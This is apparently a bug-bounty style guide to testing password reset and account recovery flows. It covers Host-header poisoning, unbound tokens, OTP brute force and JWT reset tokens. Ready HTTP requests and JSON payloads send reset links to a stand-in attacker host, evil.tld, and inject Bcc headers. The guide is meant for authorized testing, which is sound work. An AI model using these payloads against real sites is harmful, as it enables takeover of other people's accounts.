# Password Reset and Account Recovery

The reset flow is a parallel authentication system that bypasses the password. It is often built in a hurry, tested less than login, and it hands out exactly the thing an attacker wants: control of the account. This is one of the highest-yield areas in all of web testing.

## The mental model

A reset flow proves you control an identifier (usually email, sometimes phone) and then lets you set a new credential. Every bug is a break in one of three links: who the proof is sent to (can I redirect it?), what the proof is (can I predict, leak, or forge the token?), and what the proof authorizes (can I reset a different account than the one proven?).

## Where it hides / tell-tales

- **Host header controls the reset link**: the app builds the reset URL from the `Host` or `X-Forwarded-Host` header. Send the reset request with `Host: evil.tld`, and the email the victim receives contains `https://evil.tld/reset?token=...`. If they click, the token lands on your server. This is the single most common reset takeover.
- **Token in the URL leaks via Referer**: the reset page loads third-party scripts (analytics, ads, chat widgets). The full URL, token included, is sent in the `Referer` header to those third parties. Anyone with access to that analytics data has the token.
- **Weak or predictable token**: sequential, short, timestamp-seeded, based on `md5(email)` or `md5(timestamp)`, or a numeric OTP with no rate limit. If you can request resets for two accounts and see the tokens, look for structure.
- **Token not bound to the account**: the token proves "a reset was requested" but not "for whom." Request a reset for your account, get a valid token, then submit it with the victim's email or user id in the final step.
- **Response leaks the token or the new flow state**: the JSON response to the reset-request contains the token, the user id, or a `reset_url`. Check the raw response, not just the UI.
- **No invalidation of old tokens or sessions**: old reset links stay valid, multiple concurrent tokens, or completing a reset does not kill the victim's existing sessions.
- **OTP brute force**: 4 to 6 digit codes with no rate limit, no lockout, or a limit you can reset by re-requesting. Also check if the same code is reused across requests or is guessable.
- **Account enumeration in the request**: different responses for "email exists" vs "does not" turn the reset form into a user-enumeration oracle, which feeds every other attack.

## Real material

Host-header poisoning of the reset link:

```http
POST /api/password/forgot HTTP/1.1
Host: evil.tld
Content-Type: application/json

{"email":"victim@target.com"}
```
Or, when the front door validates `Host`, try the forwarding headers the backend trusts:

```http
POST /api/password/forgot HTTP/1.1
Host: app.target.com
X-Forwarded-Host: evil.tld
X-Forwarded-Server: evil.tld
X-Host: evil.tld
```
If the generated email links to `evil.tld`, the token comes to you when the victim clicks.

Token-not-bound-to-account (parameter pollution in the final step):

```http
POST /api/password/reset HTTP/1.1
Content-Type: application/json

{"token":"YOUR-VALID-TOKEN","email":"victim@target.com","password":"NewPass123!"}
```
You requested the token for your own account; if the server only checks the token is valid and ignores which account it was issued for, it resets the victim.

Email parameter pollution to leak the link to two places:

```json
{"email":"victim@target.com&email=attacker@evil.tld"}
{"email":["victim@target.com","attacker@evil.tld"]}
{"email":"victim@target.com,attacker@evil.tld"}
{"email":"victim@target.com\nbcc:attacker@evil.tld"}
```
Some mailers send to both; some honor the second; CRLF in the field can inject a `Bcc`.

## Beyond the basics

- **Host-header and the forwarding-header family**: when `Host` is pinned, the backend often still trusts `X-Forwarded-Host`, `X-Forwarded-Server`, `X-Original-URL`, `X-Rewrite-URL`, or an absolute URL in the request line. Try the whole family; the proxy and app frequently disagree about which one wins.
- **Dangling token after email change**: request a reset, then change the account email (if you have partial access) or trigger an email change; some flows leave the old token valid or send the new link to the old or new address inconsistently.
- **Race on token generation**: request many resets in parallel; some systems collide tokens, reuse a slot, or briefly expose a predictable sequence under load.
- **OTP reuse and fixation**: the same OTP valid for both reset and login, an OTP that is not consumed on use, or a flow where you can set the "verified" flag by replaying an earlier step (see `Business-Logic-and-Race-Conditions.md`).
- **Reset to takeover chain**: combine enumeration (confirm the victim exists) plus host-header poisoning (steal the token) plus no-session-invalidation (your access survives their later password change). Each alone is medium; together it is durable account takeover.
- **JWT-as-reset-token**: some apps use a JWT as the reset token. Now every `JWT-Attacks.md` technique applies: `alg:none`, weak secret, unverified claims. A reset JWT with a forgeable `sub` is instant takeover for any account.
- **Signed/encoded link tampering**: if the reset link carries `?uid=123&token=...`, try changing `uid` while keeping a valid `token`, or flipping base64/hex-encoded identifiers.

## What to watch for

- A poisoned `Host` that changes the link in the email is only exploitable if the victim clicks; frame the severity honestly, but note that many programs accept it because the link genuinely leaks the token.
- Do not actually take over real users' accounts; prove the primitive against your own two test accounts and reason about impact.
- Rate limits may be per-IP; rotating source does not make unlimited OTP guessing acceptable on a live program unless explicitly in scope.

## Hunting checklist

- Test `Host` and the full forwarding-header family on the reset-request endpoint; read the resulting link.
- Inspect the reset page for third-party scripts that would leak the token via `Referer`.
- Analyze token entropy and structure; decode JWTs and attack them.
- Submit a valid token with a different account's email/id (binding check).
- Try email parameter pollution and CRLF `Bcc` injection.
- Test OTP rate limiting, reuse, and consumption.
- Confirm old tokens and existing sessions are invalidated on completion.
- Check for user enumeration in the request response.
